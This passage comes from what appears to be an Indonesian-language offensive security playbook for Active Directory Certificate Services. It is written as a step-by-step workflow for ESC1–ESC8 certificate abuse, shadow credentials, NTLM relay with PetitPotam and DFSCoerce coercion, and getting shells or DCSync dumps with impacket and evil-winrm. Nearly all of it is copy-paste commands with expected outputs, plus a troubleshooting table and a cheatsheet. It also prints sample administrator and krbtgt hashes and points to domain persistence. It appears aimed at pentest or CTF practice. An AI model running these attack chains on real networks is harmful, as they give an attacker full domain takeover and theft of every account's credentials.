export ADMIN_HASH="fc525c9683e8fe067095ba2ddc971881"
export KRB5CCNAME="$PWD/administrator.ccache"

echo "administrator:$ADMIN_HASH" >> ~/adcs_loot/creds/found_creds.txt
cp administrator.ccache ~/adcs_loot/tickets/

# Verifikasi ticket
klist
```

**OUTPUT BERHASIL ✅ — klist output:**

text

```
Credentials cache: FILE:/root/adcs_loot/certs/administrator.ccache
        Principal: administrator@CORP.LOCAL

Valid starting     Expires            Service principal
01/09/25 13:00:10  01/09/25 23:00:10  krbtgt/CORP.LOCAL@CORP.LOCAL
```

➡️ Lanjut ke **Fase 7 — Shell Execution!**

**OUTPUT GAGAL ❌ — KDC has no support for padata type:**

text

```
[-] Got error while trying to request TGT: KDC_ERR_PADATA_TYPE_NOSUPP
```

➡️ PKINIT tidak didukung atau certificate tidak cocok. Coba cek EKU:

Bash

```
# Inspect PFX untuk cek EKU
openssl pkcs12 -in administrator.pfx -nodes -nokeys 2>/dev/null | \
    openssl x509 -noout -text 2>/dev/null | grep -A5 "Extended Key Usage"
```

text

```
# Harus ada: Client Authentication
X509v3 Extended Key Usage:
    Client Authentication
```

**OUTPUT GAGAL ❌ — Name mismatch / Object SID mismatch:**

text

```
[-] Got error: KDC_ERR_CLIENT_NAME_MISMATCH
```

➡️ Strong Certificate Mapping aktif. Certificate UPN tidak match dengan SID di AD:

Bash

```
# Cek apakah certificate punya SID extension
openssl pkcs12 -in administrator.pfx -nodes -nokeys 2>/dev/null | \
    openssl x509 -noout -text 2>/dev/null | grep -A3 "Subject Alternative Name"

# Jika tidak ada SID extension, environment ini enforce strong mapping
# Coba certipy auth dengan domain hint
certipy auth -pfx administrator.pfx -dc-ip $DC_IP -domain $DOMAIN -username administrator
```

---

## ═══════════════════════════════════════

## FASE 3: ESC2 — ANY PURPOSE / NO EKU

## ═══════════════════════════════════════

> **Masuk sini jika:** certipy find menampilkan `ESC2` pada template.

### Langkah 3.1 — Identifikasi ESC2

Bash

```
# Cari template dengan Any Purpose atau No EKU
grep -B5 -A30 "ESC2" ~/adcs_loot/enum/certipy_find.txt
grep -A5 "Any Purpose" ~/adcs_loot/enum/certipy_find.txt
```

**OUTPUT BERHASIL ✅:**

text

```
    Template Name                       : AnyPurposeTemplate
    Any Purpose                         : True
    Enrollment Agent                    : True

    [!] Vulnerabilities
      ESC2 : Template can be used for any purpose
```

---

### Langkah 3.2 — Request Any Purpose Certificate

Bash

```
export TEMPLATE_ESC2="AnyPurposeTemplate"

# Request certificate dari template Any Purpose
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "$TEMPLATE_ESC2" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'lowprivuser@corp.local'
[*] Saving certificate and private key to 'lowprivuser.pfx'
```

Bash

```
# ESC2 → Gunakan sebagai Enrollment Agent untuk ESC3
# Jika ada template target yang cocok, lanjut ke Fase 4 (ESC3)
mv lowprivuser.pfx ~/adcs_loot/certs/agent.pfx
```

---

## ═══════════════════════════════════════

## FASE 4: ESC3 — CERTIFICATE REQUEST AGENT

## ═══════════════════════════════════════

> **Masuk sini jika:** Ada template dengan `Enrollment Agent: True` yang bisa kamu enroll, DAN ada template target yang bisa di-enroll-on-behalf-of.

### Langkah 4.1 — Step 1: Dapatkan Agent Certificate

Bash

```
# Identifikasi template agent
grep -B5 -A20 "ESC3" ~/adcs_loot/enum/certipy_find.txt
grep -A3 "Enrollment Agent.*True" ~/adcs_loot/enum/certipy_find.txt

export AGENT_TEMPLATE="EnrollAgentTemplate"

# Request Enrollment Agent certificate
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "$AGENT_TEMPLATE" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'lowprivuser@corp.local'
[*] Saving certificate and private key to 'lowprivuser.pfx'
```

Bash

```
mv lowprivuser.pfx ~/adcs_loot/certs/agent.pfx
```

---

### Langkah 4.2 — Step 2: Request Certificate On-Behalf-Of Target

Bash

```
# Identifikasi template target (butuh Client Auth + schema v1 biasanya)
export TARGET_TEMPLATE="User"   # Template yang akan di-request atas nama admin
export AGENT_PFX="~/adcs_loot/certs/agent.pfx"
export ON_BEHALF_OF="CORP\\Administrator"

# Request certificate atas nama Administrator menggunakan agent cert
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "$TARGET_TEMPLATE" \
    -pfx "$AGENT_PFX" \
    -on-behalf-of "$ON_BEHALF_OF" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 103
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Saving certificate and private key to 'administrator.pfx'
```

Bash

```
mv administrator.pfx ~/adcs_loot/certs/
# Lanjut ke certipy auth (sama seperti Langkah 2.3)
certipy auth -pfx ~/adcs_loot/certs/administrator.pfx -dc-ip $DC_IP
```

**OUTPUT GAGAL ❌ — CERTSRV_E_BAD_RENEWAL_SUBJECT:**

text

```
[-] Got error: CERTSRV_E_BAD_RENEWAL_SUBJECT
```

➡️ Template target tidak menerima agent request. Coba template lain:

Bash

```
# Cari template yang punya "Authorized Signatures Required" yang rendah
grep -B5 -A20 "Client Authentication.*True" ~/adcs_loot/enum/certipy_find.txt | \
    grep -B10 "Authorized Signatures Required.*0"

# Google: "certipy ESC3 CERTSRV_E_BAD_RENEWAL_SUBJECT fix"
```

---

## ═══════════════════════════════════════

## FASE 5: ESC4 — TEMPLATE ACL ABUSE

## ═══════════════════════════════════════

> **Masuk sini jika:** certipy find menampilkan `ESC4` atau BloodHound menunjukkan GenericWrite ke template object.

### Langkah 5.1 — Konfirmasi Write Access ke Template

Bash

```
# Lihat detail ESC4 dari certipy find
grep -B5 -A30 "ESC4" ~/adcs_loot/enum/certipy_find.txt

# Atau dari BloodHound
# Cypher: MATCH p=(u)-[r:GenericWrite]->(ct:CertTemplate) RETURN p
```

**OUTPUT BERHASIL ✅:**

text

```
    Template Name                       : SecureTemplate
    Object Control Permissions
      Write Dacl                        : CORP.LOCAL\lowprivuser
    
    [!] Vulnerabilities
      ESC4 : User has dangerous permissions on template
```

---

### Langkah 5.2 — Save dan Modifikasi Template

Bash

```
export TEMPLATE_ESC4="SecureTemplate"

# PENTING: Save konfigurasi original dulu sebelum modifikasi!
certipy template \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -template "$TEMPLATE_ESC4" \
    -save-old

# Modifikasi template ke konfigurasi ESC1-like
certipy template \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -template "$TEMPLATE_ESC4" \
    -write-default-configuration
```

**OUTPUT BERHASIL ✅:**

text

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'SecureTemplate.json'
[*] Updating certificate template 'SecureTemplate'
[*] Replacing:
[*]     pKIExtendedKeyUsage
[*]     msPKI-Certificate-Name-Flag
[*]     msPKI-Enrollment-Flag
[*] Successfully updated 'SecureTemplate'
```

Bash

```
# Sekarang request certificate dari template yang sudah dimodifikasi
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "$TEMPLATE_ESC4" \
    -upn "administrator@$DOMAIN" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅ — Certificate didapat:**

text

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saving certificate and private key to 'administrator.pfx'
```

Bash

```
# Authenticate
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

---

### Langkah 5.3 — WAJIB: Restore Template Setelah Selesai

Bash

```
# Restore template ke konfigurasi original (WAJIB di real pentest!)
certipy template \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -template "$TEMPLATE_ESC4" \
    -configuration "$TEMPLATE_ESC4.json"

echo "Template $TEMPLATE_ESC4 restored on $(date)" >> ~/adcs_loot/cleanup_log.txt
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Successfully updated 'SecureTemplate'
```

---

## ═══════════════════════════════════════

## FASE 6: ESC7 — VULNERABLE CA ACL

## ═══════════════════════════════════════

> **Masuk sini jika:** certipy find menampilkan `ESC7` atau kamu punya ManageCA/ManageCertificates rights.

### Langkah 6.1 — Analisis CA Permissions

Bash

```
# Lihat detail ESC7
grep -B5 -A30 "ESC7" ~/adcs_loot/enum/certipy_find.txt
grep -A10 "ManageCA\|ManageCertificates" ~/adcs_loot/enum/certipy_find.txt
```

**OUTPUT BERHASIL ✅:**

text

```
    Permissions
      Access Rights
        ManageCA                        : CORP.LOCAL\lowprivuser
    
    [!] Vulnerabilities
      ESC7 : User has dangerous permissions on CA
```

---

### Langkah 6.2 — List Template dan Enable Template yang Diperlukan

Bash

```
# List semua template yang ada di CA
certipy ca \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -dc-ip "$DC_IP" \
    -list-templates
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Certificate Templates:
    User
    Machine
    DomainController
    SubCA
```

Bash

```
# Jika ada template vulnerable yang belum enabled, enable dulu
certipy ca \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -dc-ip "$DC_IP" \
    -enable-template "SubCA"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Successfully enabled 'SubCA' on 'CORP-CA'
```

---

### Langkah 6.3 — ESC7 Attack Path via ManageCertificates

Bash

```
# Jika punya ManageCertificates, bisa approve pending requests
# Pertama, request certificate (akan pending karena approval required)
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "SubCA" \
    -upn "administrator@$DOMAIN" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅ — Request pending:**

text

```
[*] Successfully requested certificate
[*] Request ID is 99
[-] Got error: CERTSRV_E_PENDING (The certificate is pending approval)
[*] Saved CSR to 'administrator.csr'
```

Bash

```
# Issue (approve) request menggunakan ManageCA/ManageCertificates
certipy ca \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -dc-ip "$DC_IP" \
    -issue-request 99

# Ambil certificate yang sudah di-approve
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -dc-ip "$DC_IP" \
    -retrieve 99
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Successfully issued request 99
[*] Successfully retrieved certificate
[*] Saving certificate and private key to 'administrator.pfx'
```

Bash

```
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

---

## ═══════════════════════════════════════

## FASE 7: ESC8 — NTLM RELAY KE AD CS HTTP

## ═══════════════════════════════════════

> **Masuk sini jika:** Web Enrollment aktif dan kamu bisa memposisikan diri untuk relay NTLM authentication.

### Langkah 7.1 — Setup Certipy Relay Listener

Bash

```
# Terminal 1: Setup relay listener
# CA_HOST adalah hostname CA (dari /certsrv/ yang ditemukan di Fase 0)
export CA_HOST="ca01.corp.local"

certipy relay \
    -target "http://$CA_HOST" \
    -template "DomainController"
```

**OUTPUT BERHASIL ✅ — Relay listener aktif:**

text

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Listening on 0.0.0.0:445
[*] Targeting http://ca01.corp.local/certsrv/
[*] Waiting for incoming NTLM connections...
```

---

### Langkah 7.2 — Trigger Authentication (Terminal Baru)

Bash

```
# Terminal 2: Trigger authentication dari DC ke listener kita
# (DC akan authenticate ke kita, kita relay ke AD CS)

# Method 1: PetitPotam (paling umum di CTF)
python3 /opt/PetitPotam/PetitPotam.py \
    -d "$DOMAIN" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    "$LHOST" \        # IP attacker (listener certipy)
    "$DC_IP"           # Target yang akan di-coerce

# Method 2: DFSCoerce
python3 /opt/DFSCoerce/dfscoerce.py \
    -d "$DOMAIN" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    "$LHOST" \
    "$DC_IP"
```

**OUTPUT BERHASIL ✅ — Di Terminal 1 (relay listener):**

text

```
[*] Received connection from 10.10.10.10
[*] Authenticating as CORP\DC01$
[*] Requesting certificate for 'CORP\DC01$' via HTTP(S) enrollment
[*] Successfully requested certificate
[*] Saved certificate and private key to 'dc01.pfx'
```

Bash

```
# Authenticate dengan DC machine account certificate
certipy auth \
    -pfx dc01.pfx \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Using principal: DC01$@corp.local
[*] Got TGT
[*] Saved credential cache to 'dc01.ccache'
[*] Got NT hash for 'DC01$': aad3b435b51404eeaad3b435b51404ee:NTHASH
```

Bash

```
# Dengan DC machine account, bisa DCSync!
export KRB5CCNAME="$PWD/dc01.ccache"
impacket-secretsdump -k -no-pass "CORP/DC01\$@dc01.$DOMAIN" -dc-ip $DC_IP
```

**OUTPUT GAGAL ❌ — Relay tidak menerima koneksi:**

text

```
# Tidak ada output di terminal relay listener setelah coercion
```

➡️ Coercion tidak berhasil atau DC tidak bisa reach listener kita:

Bash

```
# Cek apakah listener kita bisa di-reach
# Pastikan tidak ada firewall di port 445
sudo ss -tlnp | grep 445

# Cek versi PetitPotam yang support authenticated coercion
python3 /opt/PetitPotam/PetitPotam.py -h

# Google: "PetitPotam authenticated coercion [Windows version]"
```

**OUTPUT GAGAL ❌ — Relay berhasil tapi auth gagal:**

text

```
[*] Got certificate
[-] Certificate authentication failed: Name mismatch
```

➡️ Strong Certificate Mapping memblokir authentication. Environment sudah patch:

Bash

```
# Google: "ESC8 strong certificate mapping bypass 2024"
# Coba dengan SID extension jika Certipy versi terbaru support
```

---

## ═══════════════════════════════════════

## FASE 8: SHADOW CREDENTIALS

## ═══════════════════════════════════════

> **Masuk sini jika:** Tidak ada AD CS CA yang vulnerable, tapi kamu punya GenericWrite/WriteDACL ke user/computer object. Ini alternatif tanpa butuh CA vulnerable.

### Langkah 8.1 — Identifikasi Target untuk Shadow Credentials

Bash

```
# Dari BloodHound: siapa yang punya GenericWrite ke user/computer?
# Cypher: MATCH p=(u)-[r:GenericWrite|WriteDacl]->(target) RETURN p

# Set target yang bisa ditulis
export SHADOW_TARGET="targetuser"   # atau computer account
```

---

### Langkah 8.2 — Shadow Credentials Attack

Bash

```
# Auto mode: tambah key credential, dapat NT hash, hapus bersih
certipy shadow auto \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -account "$SHADOW_TARGET" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'targetuser'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'abc123...'
[*] Adding Key Credential with device ID 'abc123...' to the Key Credentials for 'targetuser'
[*] Successfully added Key Credential with device ID 'abc123...' to the Key Credentials for 'targetuser'
[*] Authenticating as 'targetuser' with the certificate
[*] Using principal: targetuser@corp.local
[*] Got TGT
[*] Saved credential cache to 'targetuser.ccache'
[*] Trying to retrieve NT hash for 'targetuser'
[*] Got NT hash for 'targetuser@corp.local': 7c6a180b36896a0a8c02787eeafb0e4c
[*] Restored the msDS-KeyCredentialLink attribute of the targetuser
```

Bash

```
# Simpan credential
export TARGET_HASH="7c6a180b36896a0a8c02787eeafb0e4c"
echo "$SHADOW_TARGET:$TARGET_HASH" >> ~/adcs_loot/creds/found_creds.txt
export KRB5CCNAME="$PWD/targetuser.ccache"
```

**OUTPUT GAGAL ❌ — The account does not have the required privilege:**

text

```
[-] Got error: The account does not have the required privilege
```

➡️ Tidak punya write access ke msDS-KeyCredentialLink. Verifikasi ACL lagi di BloodHound.

**OUTPUT GAGAL ❌ — KDC_ERR_PADATA_TYPE_NOSUPP:**

text

```
[-] Got error: KDC_ERR_PADATA_TYPE_NOSUPP
```

➡️ Target adalah Domain Controller atau environment tidak support PKINIT:

Bash

```
# Untuk DC: gunakan ESC8 atau delegation attack sebagai gantinya
# Untuk regular user: pastikan DC support PKINIT (Windows 2016+)
```

---

## ═══════════════════════════════════════

## FASE 9: SHELL EXECUTION (SETELAH DAPAT HASH/TICKET)

## ═══════════════════════════════════════

> **Masuk sini setelah:** Dapat NT Hash atau ccache ticket dari certipy auth.

### Langkah 9.1 — Dari NT Hash ke Shell

Bash

```
# Test hash dulu
nxc smb $DC_IP -u "administrator" -H "$ADMIN_HASH" -d "$DOMAIN"
```

**OUTPUT BERHASIL ✅ — Hash valid + Pwn3d!:**

text

```
SMB   10.10.10.10  445  DC01  [+] corp.local\administrator:fc525c... (Pwn3d!)
```

Bash

```
# Method 1: PsExec (SYSTEM shell, paling reliable)
impacket-psexec "administrator@$DC_IP" -hashes ":$ADMIN_HASH"

# Method 2: WMIExec (lebih stealth)
impacket-wmiexec "administrator@$DC_IP" -hashes ":$ADMIN_HASH"

# Method 3: SecretsDump (dump semua hash domain)
impacket-secretsdump "administrator@$DC_IP" -hashes ":$ADMIN_HASH" \
    | tee ~/adcs_loot/creds/dcsync_hashes.txt

# Method 4: Evil-WinRM (jika WinRM port 5985 open)
nxc winrm $DC_IP -u "administrator" -H "$ADMIN_HASH"
evil-winrm -i $DC_IP -u "administrator" -H "$ADMIN_HASH"
```

---

### Langkah 9.2 — Dari Kerberos Ticket ke Shell

Bash

```
# Pastikan KRB5CCNAME sudah di-set
export KRB5CCNAME="$HOME/adcs_loot/certs/administrator.ccache"
klist

# Method 1: WMIExec via Kerberos
impacket-wmiexec \
    -k \
    -no-pass \
    "$DOMAIN/administrator@dc01.$DOMAIN"

# Method 2: SMBClient via Kerberos
impacket-smbclient \
    -k \
    -no-pass \
    "$DOMAIN/administrator@dc01.$DOMAIN"

# Method 3: SecretsDump via Kerberos  
impacket-secretsdump \
    -k \
    -no-pass \
    "$DOMAIN/administrator@dc01.$DOMAIN" \
    | tee ~/adcs_loot/creds/dcsync_hashes.txt
```

**OUTPUT BERHASIL ✅ — SecretsDump berhasil:**

text

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065f6a9ed:::
```

➡️ **DOMAIN COMPROMISED!** Lanjut ke:

- **[🔐 Workflow 43 — Domain Persistence](/docs/domain-persistence)** — Buat persistence sebelum hash diubah
- Catat semua hash penting untuk lateral movement

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`KRB_AP_ERR_SKEW`|Clock beda >5 menit|`sudo ntpdate -u $DC_IP` SEBELUM APAPUN|
|`KDC_ERR_PADATA_TYPE_NOSUPP`|PKINIT tidak support atau EKU salah|Cek EKU dengan `openssl pkcs12 -in cert.pfx -nodes -nokeys|
|`CERTSRV_E_UNSUPPORTED_CERT_TYPE`|Template tidak dipublish CA|Cek nama template exact dari certipy find|
|`CERTSRV_E_TEMPLATE_DENIED`|Tidak punya enrollment rights|Cek Enrollment Rights di certipy find|
|`CERTSRV_E_BAD_RENEWAL_SUBJECT`|Template target tidak support agent request|Cari template berbeda atau ESC path lain|
|`Name mismatch` / `Object SID mismatch`|Strong certificate mapping aktif|Coba user target yang berbeda, atau cari SID extension approach|
|`KDC_ERR_CLIENT_NAME_MISMATCH`|UPN pada cert tidak cocok dengan AD|Gunakan exact UPN dari AD object|
|`LDAP Error: invalid credentials`|Credentials salah|`nxc smb $DC_IP -u $USERNAME -p $PASSWORD` untuk verifikasi|
|`certipy find` tidak temukan ESC|Environment hardened atau certipy outdated|Update certipy: `pip3 install --upgrade certipy-ad`|
|`relay tidak dapat koneksi`|Firewall blokir port 445 atau DC tidak bisa reach attacker|Pastikan tidak ada firewall, cek `ss -tlnp \| grep 445`|
|`PFX authentication failed`|PFX rusak atau salah password|`openssl pkcs12 -in cert.pfx -info` untuk cek|
|`rpc_s_access_denied` saat CA operation|Tidak punya ManageCA rights|Verifikasi ESC7 permissions di certipy find|
|`KRB_AP_ERR_TKT_EXPIRED`|Ticket expired|Request TGT baru via certipy auth|
|`HTTP 403` dari certsrv|IIS config atau policy|Cek apakah NTLM diterima: `curl -v http://$CA_HOST/certsrv/`|

**Jika buntu total — Google Search yang efektif:**

text

```
# Template pencarian:
certipy [error message] [ESC number] bypass
"[specific error code]" certipy AD CS solution
HackTricks AD CS [ESC1/ESC2/...] exploitation
site:github.com certipy issue [error] fix
AD CS pentest [error] [Windows Server version]
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Punya domain credentials
│
├─ FASE 0: Deteksi AD CS existence
│   ├─ [CA ditemukan] → FASE 1 (Certipy Find)
│   └─ [Tidak ada CA] → Skip ke workflow lain (Delegation/ACL)
│
├─ FASE 1: Certipy Find — Identifikasi ESC
│   ├─ [ESC1 ditemukan] → FASE 2 (ESC1: Enrollee Supplies Subject)
│   ├─ [ESC2 ditemukan] → FASE 3 (ESC2: Any Purpose)
│   ├─ [ESC3 ditemukan] → FASE 4 (ESC3: Enrollment Agent)
│   ├─ [ESC4 ditemukan] → FASE 5 (ESC4: Template ACL)
│   ├─ [ESC7 ditemukan] → FASE 6 (ESC7: CA ACL)
│   ├─ [ESC8 ditemukan] → FASE 7 (ESC8: NTLM Relay)
│   └─ [Tidak ada ESC]  → FASE 8 (Shadow Credentials via ACL)
│
├─ FASE 2-8: Exploitation berbasis ESC type
│   └─ [Certificate didapat] → certipy auth
│
├─ certipy auth:
│   ├─ [Berhasil → NT Hash + ccache] → FASE 9 (Shell Execution)
│   └─ [Gagal → strong mapping]      → Analisis SID, target user lain
│
└─ FASE 9: Shell via Hash/Ticket
    ├─ impacket-psexec/wmiexec (shell)
    ├─ evil-winrm (jika WinRM open)
    └─ impacket-secretsdump (DCSync)
        └─ → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export DC_IP="10.10.10.10"; export CA_IP="10.10.10.11"
export DOMAIN="corp.local"; export DOMAIN_UPPER="CORP.LOCAL"
export USERNAME="user"; export PASSWORD="pass"
export CA_NAME="CORP-CA"; export CA_HOST="ca01.corp.local"
sudo ntpdate -u $DC_IP   # ALWAYS FIRST

# === ENUMERATION ===
certipy find -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip $DC_IP -stdout
certipy find -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip $DC_IP -output adcs_enum

# === ESC1: Request + Authenticate ===
certipy req -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" \
    -template "VulnTemplate" -upn "administrator@$DOMAIN" -dc-ip $DC_IP
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
export KRB5CCNAME="$PWD/administrator.ccache"

# === ESC3: Agent + On-Behalf-Of ===
certipy req -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" \
    -template "AgentTemplate" -dc-ip $DC_IP
certipy req -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" \
    -template "User" -pfx agent.pfx -on-behalf-of "CORP\\Administrator" -dc-ip $DC_IP

# === ESC4: Modify Template ===
certipy template -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip $DC_IP \
    -template "SecureTemplate" -save-old
certipy template -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip $DC_IP \
    -template "SecureTemplate" -write-default-configuration
# [request cert] → [restore template]
certipy template -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip $DC_IP \
    -template "SecureTemplate" -configuration "SecureTemplate.json"

# === ESC7: CA Management ===
certipy ca -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" -dc-ip $DC_IP -list-templates
certipy ca -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" -dc-ip $DC_IP -issue-request 99
certipy req -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" -dc-ip $DC_IP -retrieve 99

# === ESC8: NTLM Relay ===
certipy relay -target "http://$CA_HOST" -template "DomainController"
# [Trigger dengan PetitPotam/DFSCoerce di terminal lain]

# === SHADOW CREDENTIALS ===
certipy shadow auto -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -account "targetuser" -dc-ip $DC_IP

# === SHELL via HASH ===
impacket-psexec "administrator@$DC_IP" -hashes ":$ADMIN_HASH"
impacket-wmiexec "administrator@$DC_IP" -hashes ":$ADMIN_HASH"
impacket-secretsdump "administrator@$DC_IP" -hashes ":$ADMIN_HASH"

# === SHELL via TICKET ===
export KRB5CCNAME="administrator.ccache"
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@dc01.$DOMAIN"
impacket-secretsdump -k -no-pass "$DOMAIN/administrator@dc01.$DOMAIN"

# === INSPECT PFX ===
openssl pkcs12 -in administrator.pfx -nodes -nokeys 2>/dev/null | \
    openssl x509 -noout -text 2>/dev/null | grep -E "Subject|EKU|SAN|Validity" -A3
```

---

> **➡️ NEXT:** Setelah AD CS exploitation berhasil dan dapat Domain Admin hash/ticket, lanjut ke:
> 
> - **[🔁 Workflow 41 — NTLM Relay](/docs/ntlm-relay)** — Untuk teknik relay yang lebih dalam (ESC8 bergantung pada ini)
> - **[🔐 Workflow 43 — Domain Persistence](/docs/domain-persistence)** — Buat persistence sebelum hash diubah (certificate-based persistence sangat powerful karena tidak expire saat password reset)
> - **[🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)** — Gunakan hash untuk pivot ke machine lain di network